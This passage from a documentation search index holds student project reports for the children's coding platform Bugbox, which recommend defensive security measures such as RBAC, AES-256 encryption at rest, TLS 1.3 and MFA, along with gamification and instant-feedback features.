ensuring the security and trustworthiness of the platform. ","version":"Next","tagName":"h2"},{"title":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#introduction","content":" In this report, I will be reviewing whether in-house or purchased (outsourced) cybersecurity infrastructure is more suitable for BugBox’s needs, considering BugBox’s size and resources as a start-up company and associated opportunity costs with both approaches.  ","version":"Next","tagName":"h2"},{"title":"Recommendation​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#recommendation","content":" When deciding between purchasing third-party cybersecurity solutions and developing them in-house, the optimal approach for Bugbox would be a balanced strategy that combines the use of cloud-based cybersecurity services with in-house development and control. This approach allows Bugbox to leverage the strengths of established, secure cloud platforms while maintaining the flexibility and control to implement custom cybersecurity practices tailored to its specific needs.  ","version":"Next","tagName":"h2"},{"title":"Cloud-Based Cybersecurity Solutions​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#cloud-based-cybersecurity-solutions","content":" In today’s day and age, companies no longer have to own dedicated IT infrastructure to host their servers and other key databases. Cloud-based services, such as Software as a Service (SaaS), allow organizations to piggyback on the resources of companies specializing in cloud computing infrastructure and services. This is feasible due to the exponential growth in internet speeds, capacity, and bandwidth.  Cloud platforms such as Amazon Web Services (AWS), Google Cloud Platform (GCP), and Microsoft Azure offer robust, scalable, and cost-effective cybersecurity services. These providers invest heavily in maintaining top-tier security, offering services that are constantly updated to protect against the latest threats. Bugbox can benefit from these investments without having to reinvent the wheel by developing security solutions from scratch.  ","version":"Next","tagName":"h2"},{"title":"Key Advantages of Cloud-Based Security:​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#key-advantages-of-cloud-based-security","content":" Scalability: Cloud platforms offer security features that can scale seamlessly as Bugbox’s user base grows. For instance, AWS provides tools like AWS Shield (for Distributed Denial of Service protection) and AWS Identity and Access Management (IAM) (for access control), which can easily be adapted to Bugbox’s needs without significant overhead.Compliance and Certifications: Cloud providers comply with a wide range of security certifications such as ISO 27001, SOC 2, GDPR, and COPPA. Bugbox can leverage these certifications to meet regulatory compliance without having to invest heavily in achieving them independently.Cost-Effective Security Infrastructure: Cloud platforms provide security tools and services on a pay-as-you-go basis. Bugbox can avoid large upfront costs for hardware and software, instead paying for what it uses.  ","version":"Next","tagName":"h3"},{"title":"Recommended Cloud Services for Bugbox:​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#recommended-cloud-services-for-bugbox","content":" AWS KMS (Key Management Service): Provides strong encryption and secure key management for data-at-rest. AWS KMS also integrates with other AWS services, ensuring that all sensitive data is encrypted both in transit and at rest.AWS Shield and AWS WAF (Web Application Firewall): To protect against DDoS attacks and malicious web traffic. These services provide managed threat detection and mitigation, ensuring Bugbox is always protected from common attack vectors.AWS CloudTrail and AWS GuardDuty: For monitoring and logging. CloudTrail records API calls, which is crucial for auditing, while GuardDuty continuously monitors for suspicious activity, reducing the burden of manual security monitoring.        ","version":"Next","tagName":"h3"},{"title":"Outsource Routine Security Operations​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#outsource-routine-security-operations","content":" By using managed security services like AWS Security Hub or Azure Security Center, Bugbox can benefit from pre-configured, industry-standard security controls and monitoring without the need to dedicate significant in-house resources. These services provide real-time monitoring, vulnerability assessments, and automatic compliance checks, helping Bugbox maintain a strong security posture.  ","version":"Next","tagName":"h3"},{"title":"In-House Control Strategy​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#in-house-control-strategy","content":" While Bugbox can rely on cloud providers for the infrastructure and security management, it is critical that the organization retains in-house control over key security practices such as access control, user management, and incident response.  ","version":"Next","tagName":"h2"},{"title":"Custom In-House Controls:​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#custom-in-house-controls","content":" Role-Based Access Control (RBAC): Bugbox should develop in-house RBAC policies tailored specifically to its platform’s user base, such as students, educators, and administrators. This ensures that users only have access to the information and tools relevant to their role, reducing the risk of data breaches.Multi-Factor Authentication (MFA): Although services like AWS Cognito or Microsoft Azure AD provide MFA solutions, Bugbox should manage the policies and enforcement of MFA internally to ensure all users adhere to Bugbox-specific security requirements. I will be covering RBAC in detail in another report, while my groupmate is working on MFA.  ","version":"Next","tagName":"h3"},{"title":"Secure Application Development​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#secure-application-development","content":" For custom features specific to the Bugbox platform, such as student data handling, classroom management systems, and gamified learning environments, Bugbox should retain control over how security is integrated into the development lifecycle.  ","version":"Next","tagName":"h3"},{"title":"In-House Secure Development Lifecycle (SDL):​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#in-house-secure-development-lifecycle-sdl","content":" Secure Coding Practices: Bugbox developers should be trained to follow secure coding standards, such as those defined by OWASP (Open Web Application Security Project), ensuring the platform is secure from common vulnerabilities like XSS, SQL injection, and insecure authentication mechanisms.In-House Penetration Testing: Bugbox should conduct regular penetration testing on its platform to identify and fix vulnerabilities that may not be detected by automated tools. This testing can be outsourced for the actual execution, but the management and understanding of results should be controlled in-house.Custom Security Audits: While third-party cloud solutions provide infrastructure-level security monitoring, Bugbox’s development team should conduct internal audits focusing on application-level security, such as how user data is handled within its custom-built features.  ","version":"Next","tagName":"h3"},{"title":"Incident Response and Business Continuity​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#incident-response-and-business-continuity","content":" Cloud platforms provide excellent disaster recovery solutions, but Bugbox should have its own incident response plan (IRP) and business continuity plan (BCP) to deal with cybersecurity incidents. The in-house team should be responsible for detecting, responding to, and mitigating incidents as they happen, including breaches involving sensitive student data.  Bugbox can use cloud-based logging and monitoring solutions like AWS CloudWatch and GuardDuty, but its Security Operations Center (SOC) or equivalent in-house security team should manage response efforts. This ensures Bugbox can take immediate action when incidents occur.  ","version":"Next","tagName":"h2"},{"title":"Analysis and Review of Balanced Approach​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#analysis-and-review-of-balanced-approach","content":" ","version":"Next","tagName":"h2"},{"title":"Cost Efficiency​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#cost-efficiency","content":" Cloud services such as AWS provide pre-built, scalable solutions that Bugbox can integrate without having to hire and maintain a full in-house security team for routine operations. Bugbox can purchase key security features—such as encryption, DDoS protection, and compliance checks—while focusing its internal resources on higher-value activities like policy development and custom platform security features.  ","version":"Next","tagName":"h3"},{"title":"Scalability and Agility​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#scalability-and-agility","content":" Cloud services provide scalability on demand, ensuring that as Bugbox’s user base grows, security features scale accordingly without the need for significant in-house reengineering. Bugbox can also take advantage of continuous improvements in cloud security, as providers regularly update their platforms to meet the latest security threats.  ","version":"Next","tagName":"h3"},{"title":"Focused In-House Development​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#focused-in-house-development","content":" By leveraging cloud infrastructure for routine tasks and core cybersecurity services, Bugbox’s in-house team can focus on customized, user-specific security features that enhance the platform's unique use case. This includes developing secure authentication flows, student data management, and classroom oversight controls, all designed with the needs of primary-aged students in mind.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Report on Purchasing vs In-house Cybersecurity Solutions for BugBox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Cybecurity-Solutions-Review#conclusion","content":" For Bugbox, adopting a hybrid cybersecurity strategy that balances cloud-based security solutions with in-house control over key aspects of its platform is the optimal choice. By leveraging the advanced security features offered by cloud providers like AWS, Bugbox can secure its infrastructure with minimal overhead, while in-house efforts can focus on building and maintaining custom security policies, access controls, and incident response mechanisms. This balanced approach allows Bugbox to scale securely, meet compliance requirements, and continue providing a safe, engaging learning environment for students and educators. ","version":"Next","tagName":"h2"},{"title":"Report on Adding Gamification to Bugbox","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Gamification Research/Adding Gamification","content":"","keywords":"","version":"Next"},{"title":"Goals and Engagement Tracking​","type":1,"pageTitle":"Report on Adding Gamification to Bugbox","url":"/redback-documentation/docs/project-5/Gamification Research/Adding Gamification#goals-and-engagement-tracking","content":" Learning Goals: First, we need to decide what we want kids to learn in different subjects.  Engagement Tracking: We’ll keep an eye on how much time kids spend on Bugbox, how often they log in, and how many tasks they finish. This will help us see if they are engaged and enjoying the platform.  ","version":"Next","tagName":"h2"},{"title":"Understanding Our Users​","type":1,"pageTitle":"Report on Adding Gamification to Bugbox","url":"/redback-documentation/docs/project-5/Gamification Research/Adding Gamification#understanding-our-users","content":" Age-Appropriate Content: We need to make sure that the games and activities are suitable for kids aged 8-15, taking into account their interests and maturity levels.  Themes and Characters: We should use popular themes and characters that kids love to keep them interested.  ","version":"Next","tagName":"h2"},{"title":"Gamification Features​","type":1,"pageTitle":"Report on Adding Gamification to Bugbox","url":"/redback-documentation/docs/project-5/Gamification Research/Adding Gamification#gamification-features","content":" Points and Badges: Kids can earn points for completing lessons and quizzes.  Leaderboards: We can set up two types of leaderboards: one for small groups of students and another for the whole class. This will create friendly competition.  Rewards: Kids can earn virtual rewards like stickers or avatars, and we could also offer real prizes for bigger achievements.  Challenges and Quests: We can introduce themed challenges and team quests where kids work together to solve problems.  Levels and Progression: We can create a levelling system where kids unlock new content and features as they progress.  User Experience Design​  Visual Progress: Use stars, progress bars, or other visuals to show kids how much they’ve completed.  Instant Feedback: Give kids immediate feedback when they finish tasks to encourage them to keep going.  Content Design​  Animated Explanations: Include animations and interactive elements to make learning more engaging and easier to understand.  Social Interaction and Monitoring​  Classroom Integration: Allow teachers to create specific challenges for their classes and track how students are doing.  Peer Interaction: Create opportunities for kids to interact and collaborate safely with their classmates.  Teacher Dashboards: Provide teachers with dashboards to help them see how engaged their students are and track their progress. ","version":"Next","tagName":"h3"},{"title":"Report on Role-Based Access Control and Data-at-Rest Management","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#introduction","content":" Bugbox, as an edtech educational platform, deals with sensitive data, including student records, lesson plans, and intellectual property. To ensure a secure environment, two key cybersecurity practices need to be implemented: Role-Based Access Control (RBAC) and Data-at-Rest management. This report provides a comprehensive understanding of these two cybersecurity strategies, focusing on both technical and non-technical aspects. It explains the rationale behind implementing these measures and how they can be applied effectively to Bugbox's unique environment.  ","version":"Next","tagName":"h2"},{"title":"Role-Based Access Control (RBAC)​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#role-based-access-control-rbac","content":" Role-Based Access Control (RBAC) restricts access to data and resources based on a user's role within an organization. In RBAC, instead of assigning individual permissions to each user, users are grouped into roles (e.g., student, teacher, administrator), and each role is granted specific permissions. This ensures users only have access to the information and functions necessary to perform their job or task.  For Bugbox, RBAC ensures that educators have access to classroom management tools, while students only have access to their individual learning materials. Administrators may have broader permissions, such as managing users and overseeing data analytics.  ","version":"Next","tagName":"h2"},{"title":"Why RBAC is Important for Bugbox​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#why-rbac-is-important-for-bugbox","content":" RBAC minimizes the potential for accidental and malicious data breaches by restricting access based on user roles. Sensitive data, such as student records and lesson plans, are only available to those who need it. For example, an educator should not have access to administrative functions, and a student should not be able to access a teacher's resources. This system enhances security and streamlines permission management, particularly as the platform grows.  From a technical perspective, implementing RBAC in Bugbox involves defining user roles and assigning corresponding permissions. These permissions are enforced using Access Control Lists (ACLs) at both the application and database levels, ensuring users can only perform actions allowed by their role. Bugbox can also enhance security by incorporating Attribute-Based Access Control (ABAC), which applies additional criteria like location or time of access to refine permissions.  ","version":"Next","tagName":"h3"},{"title":"Technical Implementation of RBAC​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#technical-implementation-of-rbac","content":" The technical implementation of RBAC within Bugbox's platform can follow these key steps:  Define Roles and Permissions: Role Definitions: Identify core roles like students, teachers, administrators, and support staff.Permission Assignments: Define which resources (e.g., lesson plans, student data) and operations (e.g., view, edit, delete) are allowed for each role. Access Control Lists (ACLs): Implementation: Use ACLs at both the application and database levels to specify which role can perform which operation on a resource.Example: Teachers may be granted permission to edit lesson plans but not modify administrative settings. Role Hierarchies: Nested Roles: Implement hierarchies where higher-level roles (e.g., administrators) inherit permissions from lower-level roles (e.g., teachers).      Attribute-Based Access Control (ABAC): Additional Security: Incorporate ABAC to add contextual restrictions such as location, device, or time of access. Audit Logs and Monitoring: Tracking: Implement logging to monitor access control events, tracking unauthorized access attempts.Tools: Use tools like Graylog or Splunk for real-time access monitoring.  ","version":"Next","tagName":"h3"},{"title":"Data-at-Rest Management​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#data-at-rest-management","content":" Data-at-Rest management ensures that data stored on physical storage devices is encrypted, preventing unauthorized access. Even if an attacker gains access to the storage media, encrypted data remains unreadable without the correct decryption keys.  For Bugbox, encrypting student records, credentials, and educational content is essential to prevent data theft, particularly if physical devices or cloud infrastructure are compromised.  ","version":"Next","tagName":"h2"},{"title":"Technical Implementation of Data-at-Rest Encryption​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#technical-implementation-of-data-at-rest-encryption","content":" The technical implementation of Data-at-Rest Encryption involves the following steps:  Choose the Encryption Algorithm: AES-256: Use AES-256, a symmetric encryption standard, to encrypt all sensitive data.TLS for Encryption Keys: Ensure encryption keys used for AES-256 are encrypted during transmission using TLS and stored securely. Encrypt Databases: Database-Level Encryption (TDE): Use Transparent Data Encryption (TDE) to encrypt databases and their backups (e.g., MySQL TDE, PostgreSQL’s pgcrypto).Column-Level Encryption: Encrypt sensitive columns like passwords and email addresses. File System Encryption: Linux Systems (LUKS): Use LUKS for encrypting file systems on Linux-based environments.Windows Systems (BitLocker): Use BitLocker for file system encryption on Windows environments. Cloud Storage Encryption: AWS KMS: For cloud storage, use AWS KMS or Azure Key Vault for key management and encryption services.Envelope Encryption: Use envelope encryption, where data is encrypted with a Data Encryption Key (DEK), and the DEK is encrypted with a Master Key. Key Management and Rotation: HSM: Store encryption keys in a Hardware Security Module (HSM) or cloud-based KMS.Separation of Duties: Ensure encryption keys are stored separately from the data to prevent unauthorized decryption. Audit and Monitoring: Logging and Alerts: Implement systems to log access to encrypted data and trigger alerts if suspicious activity is detected.Key Access Tracking: Continuously track who has access to decryption keys.  ","version":"Next","tagName":"h3"},{"title":"Importance of Data-at-Rest Encryption for Bugbox​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#importance-of-data-at-rest-encryption-for-bugbox","content":" Protects Sensitive Data: Encrypting sensitive data ensures that even in the event of a breach, the information remains secure.Compliance: Encryption helps Bugbox comply with data protection regulations like GDPR and COPPA.Prevents Data Theft: Encryption protects Bugbox’s intellectual property from being stolen or tampered with.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Report on Role-Based Access Control and Data-at-Rest Management","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/RBAC-RestingDataManagement-Report#conclusion","content":" Implementing RBAC and Data-at-Rest management through encryption is crucial for Bugbox to secure its platform and maintain compliance with data protection regulations. RBAC limits access based on user roles, reducing the risk of unauthorized access, while encryption ensures that even if data is accessed, it remains protected. Together, these security measures provide a comprehensive approach to securing Bugbox’s educational platform. ","version":"Next","tagName":"h2"},{"title":"Report over Instant Feedback Mechanism in BugBox: Strategies to Foster Engagement and Accomplishment","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Gamification Research/Instant Feedback Mechanism","content":"","keywords":"","version":"Next"},{"title":"The Importance of Instant Feedback​","type":1,"pageTitle":"Report over Instant Feedback Mechanism in BugBox: Strategies to Foster Engagement and Accomplishment","url":"/redback-documentation/docs/project-5/Gamification Research/Instant Feedback Mechanism#the-importance-of-instant-feedback","content":" In educational environments, feedback has a profound influence on motivation and learning outcomes. According to constructivist learning theory, immediate feedback helps learners make sense of new information by connecting it to prior knowledge. The theory of self-determination also underscores the importance of autonomy, competence, and relatedness in motivating learners. Instant feedback addresses the need for competence by showing learners their progress in real time, reinforcing their sense of mastery.  ","version":"Next","tagName":"h2"},{"title":"Theoretical Strategies for Effective Instant Feedback​","type":1,"pageTitle":"Report over Instant Feedback Mechanism in BugBox: Strategies to Foster Engagement and Accomplishment","url":"/redback-documentation/docs/project-5/Gamification Research/Instant Feedback Mechanism#theoretical-strategies-for-effective-instant-feedback","content":" 3.1 Timeliness and Specificity:The quicker the feedback, the more effective it is in solidifying learning. Feedback should not only be immediate but also specific, highlighting both successes and areas for improvement.  • Strategy: Upon completing a math quiz, Bugbox could instantly display the correct answers for missed questions and explain why the student's response was incorrect. This would help students learn from their mistakes immediately.  • Example: The app Khan Academy does this effectively by providing students with hints and detailed explanations for incorrect answers, enabling them to immediately understand and learn from their errors.  3.2 Positive Reinforcement and Celebratory Feedback:Positive reinforcement motivates users by making them feel good about their achievements. Instant feedback that celebrates small wins helps learners feel accomplished, regardless of the overall result.  • Strategy: Upon task completion, Bugbox can reward students with virtual trophies or stars along with animated celebrations (e.g., a confetti shower). This can boost their morale and keep them engaged.  • Example: Duolingo is known for its instant celebratory feedback. Every time a learner finishes a lesson, they receive a burst of celebration through sounds and animations that mark their progress.  3.3 Actionable Feedback:Actionable feedback offers suggestions for improvement. This is crucial in educational platforms, as users need to understand how they can do better.  • Strategy: If a student answers a quiz question incorrectly, Bugbox can provide them with hints or guide them to a resource (e.g., a short explanation or video) that helps clarify the topic. After reviewing, the student can attempt the question again with more context.  • Example: Google Classroom allows teachers to provide detailed comments on assignments, offering both praise and constructive feedback. Similarly, Bugbox could offer immediate, task-specific advice through personalized feedback messages.  3.4 Progress Tracking and Visual Feedback:Visual progress tracking helps students see their improvement over time. Feedback in the form of progress bars, badges, or stars helps users understand their trajectory and pushes them to continue.  • Strategy: Bugbox could introduce a progress bar that fills up each time a student completes a task, making their progress toward mastery or the next level visible. Stars or badges earned should appear immediately to highlight the learner's achievements.  • Example: In ClassDojo, students receive immediate visual feedback through points and badges. The platform uses bright visuals and positive messages to show students their progress, encouraging them to keep improving.  3.5 Social Validation and Peer Feedback:In addition to system-generated feedback, peer recognition can be a powerful motivator. Social validation makes students feel like their accomplishments are valued by others, fostering a sense of community.  • Strategy: Bugbox can allow students to share their achievements (e.g., badges or levels completed) with classmates through a shared leaderboard or classroom feed. Peers can &quot;like&quot; or comment on each other's achievements, offering encouragement.  • Example: The platform Quizlet allows users to create and share study sets. When a user successfully completes a study set, their peers can see their progress and offer comments, reinforcing social validation.  3.6 Gamified Feedback Through Rewards and Quests:Quests, challenges, and rewards are powerful feedback tools that help learners understand the purpose of their efforts. By receiving a reward immediately after completing a task, users are more likely to continue engaging with the platform.  • Strategy: After completing a themed quest in Bugbox, such as a science-based challenge, students could be instantly rewarded with a rare virtual item or the ability to unlock a new level. This provides immediate gratification and a sense of accomplishment.  • Example: In Prodigy Math Game, students earn pets, outfits, or other virtual rewards right after solving math problems. This immediate feedback loop rewards children for their learning efforts and encourages further participation.  Examples of Successful Instant Feedback Mechanisms in other platforms​  4.1 Fitbit’s Immediate Health Feedback:Fitbit provides instant feedback on health metrics such as step counts, heart rate, and calories burned. The real-time feedback loop encourages users to stay active and maintain their fitness goals.  • Integration with Bugbox: Similarly, Bugbox could provide instant feedback on learning metrics like how many questions were answered correctly or how much time was spent studying. This constant stream of data keeps students aware of their performance and motivates them to stay engaged.  4.2 Kahoot’s Gamified Quiz Feedback:Kahoot! offers immediate feedback after each quiz question, letting students know how they performed compared to their peers. The competitive element encourages students to learn from their mistakes and perform better in the next round.  • Integration with Bugbox: Bugbox could apply a similar technique, offering instant quiz results that compare a student’s performance to their classmates, with animated feedback for both correct and incorrect answers.  Benefits of an Effective Instant Feedback Mechanism:​  5.1 Enhanced Motivation:By delivering instant feedback, Bugbox will enhance motivation among its users, making learning more exciting and rewarding. Positive reinforcement creates a cycle of achievement, motivating students to engage further with the platform.  5.2 Fostering a Growth MindsetImmediate feedback helps students develop a growth mindset. Instead of fearing failure, students learn to view it as an opportunity for improvement when provided with constructive feedback and actionable advice.  5.3 Improved Learning OutcomesBy providing tailored and immediate feedback, Bugbox can help students learn from their mistakes right away, which improves retention and understanding of the subject matter.  Conclusion:​  An effective instant feedback mechanism not only enhances the user experience but also significantly boosts engagement and learning outcomes. By implementing the theoretical strategies discussed in this report, Bugbox can provide timely, specific, and actionable feedback that fosters a sense of accomplishment and keeps learners motivated. This feedback loop will ensure that children remain engaged with the platform, continuously improving their skills while enjoying the learning process. By taking cues from successful platforms such as Duolingo, Khan Academy, and Prodigy Math Game, Bugbox can create a dynamic, engaging learning environment that motivates students to learn and grow. ","version":"Next","tagName":"h3"},{"title":"Questacon's Games Overview","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Gamification Research/Questacon's study","content":"","keywords":"","version":"Next"},{"title":"Graphic Designing Aspect​","type":1,"pageTitle":"Questacon's Games Overview","url":"/redback-documentation/docs/project-5/Gamification Research/Questacon's study#graphic-designing-aspect","content":" Exhibition Design: Questacon's exhibits often feature custom illustrations and design elements that are both educational and visually engaging. Designers like Alicia Constantine and studios such as Inklab have contributed to creating award-winning artwork for Questacon. The designs often draw inspiration from historical illustrations, such as those by Heath Robinson, known for depicting complex and whimsical machinery.  Unique Logos: Each exhibition at Questacon is given a distinct identity through unique logos. These logos are carefully crafted to reflect the theme and narrative of the exhibition, with John Richardson playing a key role in their development.  Technological Integration: The Exhibit Design and Development team at Questacon uses advanced computer graphics systems, like the Apple Macintosh, to create detailed and precise exhibit designs. This technological integration allows for more sophisticated and interactive displays.  Collaborative and Cultural Elements: Questacon collaborates with organizations like Geoscience Australia to develop graphic exhibitions that use visual imagery, such as satellite data, to educate visitors. Additionally, Questacon incorporates cultural elements into its exhibits, such as a mural themed around the United Nations Sustainable Development Goals, created by local graffiti artists, and collaborations with Indigenous communities to blend traditional knowledge with modern technology. ","version":"Next","tagName":"h2"},{"title":"Recommended Cybersecurity Approach for Bugbox","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#introduction","content":" Bugbox is an educational platform aimed at enhancing STEM education by providing a gamified, interactive programming experience for primary-aged students. As Bugbox grows and expands its platform, it becomes essential to ensure a robust cybersecurity infrastructure that aligns with industry best practices. Bugbox must safeguard sensitive data, maintain compliance with legal and regulatory standards, and provide a secure environment for both students and educators. In this report, we propose a series of technical cybersecurity measures specifically tailored to the needs of Bugbox, focusing on securing data transmission, enhancing authentication mechanisms, and fortifying platform defenses.  ","version":"Next","tagName":"h2"},{"title":"Data Encryption​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#data-encryption","content":" ","version":"Next","tagName":"h2"},{"title":"Securing Data Transmission​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#securing-data-transmission","content":" As Bugbox involves interactive sessions between educators, students, and its platform, all data transmitted between users and Bugbox must be encrypted to prevent unauthorized interception or tampering. The most effective way to achieve this is by implementing HTTPS across the entire platform. HTTPS ensures that data exchanged over the network is encrypted using Transport Layer Security (TLS), making it unreadable to anyone attempting to intercept the communication.  To achieve optimal security, Bugbox should implement TLS 1.3, which offers enhanced security features and faster handshakes compared to its predecessors. Strong cipher suites, such as AES-256 encryption with elliptic-curve Diffie-Hellman (ECDHE) key exchange, should be used. Furthermore, Bugbox must obtain SSL/TLS certificates from a trusted Certificate Authority (CA) and implement automated certificate renewal processes using tools like Let’s Encrypt and Certbot.  Objective: To secure all data transmitted between users and the Bugbox platform by implementing HTTPS across the entire site.  Technical Details:  TLS 1.3: Use the latest version of TLS to ensure encryption during transmission.Certificate Management: Obtain SSL/TLS certificates from a trusted CA. Implement automated renewal processes.HSTS (HTTP Strict Transport Security): Enforce HSTS to ensure that browsers only communicate over HTTPS.Content Security Policy (CSP): Implement a CSP to prevent cross-site scripting (XSS) attacks.  ","version":"Next","tagName":"h3"},{"title":"Protecting Data at Rest​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#protecting-data-at-rest","content":" Bugbox stores a variety of sensitive data, including student information, user credentials, and educational content. To secure this data, Bugbox should employ encryption-at-rest across its databases and file storage systems. The recommended algorithm for encryption-at-rest is AES-256.  At the database level, Bugbox should implement Transparent Data Encryption (TDE) to ensure the entire database and its backups are encrypted automatically. Bugbox should also use encryption tools like LUKS on Linux or BitLocker on Windows. To manage encryption keys securely, Bugbox should employ a Hardware Security Module (HSM) or a cloud-based Key Management Service (KMS) like AWS KMS or Azure Key Vault.  Objective: To protect sensitive data stored in Bugbox’s databases and file storage systems.  Technical Details:  Encryption Algorithms: Use AES-256 for all sensitive data in databases.Database-Level Encryption: Implement TDE for databases like PostgreSQL or MySQL.File System Encryption: Encrypt file storage using tools like LUKS or BitLocker.Key Management: Regularly rotate encryption keys and use envelope encryption.  ","version":"Next","tagName":"h3"},{"title":"Multi-Factor Authentication (MFA)​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#multi-factor-authentication-mfa","content":" ","version":"Next","tagName":"h2"},{"title":"Enhancing User Authentication​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#enhancing-user-authentication","content":" Given Bugbox’s target audience of children and educators, the platform must implement Multi-Factor Authentication (MFA) to enhance security. Bugbox can implement time-based one-time passwords (TOTP), generated through apps like Google Authenticator or Authy, or consider hardware-based tokens like YubiKey.  To integrate MFA, Bugbox should modify its authentication flow by using libraries such as PyOTP for Python-based systems or Authenticator for Node.js. MFA secret keys should be encrypted and stored securely in Bugbox's database.  Objective: To add an additional layer of security for user accounts by requiring multiple forms of verification.  Technical Details:  MFA Methods: Implement TOTP using apps like Google Authenticator or hardware tokens like YubiKey.Backend Integration: Securely handle the generation and transmission of MFA codes.Backup Methods: Provide users with backup codes.Session Management: Implement secure session management with session cookies marked as Secure, HttpOnly, and SameSite.  ","version":"Next","tagName":"h3"},{"title":"Backup Authentication and Session Management​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#backup-authentication-and-session-management","content":" Bugbox should provide one-time-use backup codes and ensure secure session management where cookies are marked as Secure, HttpOnly, and SameSite. Sessions should expire automatically after periods of inactivity.  ","version":"Next","tagName":"h3"},{"title":"Regular Security Audits and Updates​","type":1,"pageTitle":"Recommended Cybersecurity Approach for Bugbox","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Recommended-Approaches-Report#regular-security-audits-and-updates","content":" ","version":"Next","tagName":"h2"},{"title":"Automated Vulnerability Scanning​","type":1,"pageTitle":"Recommended Cybersecurity Approach for 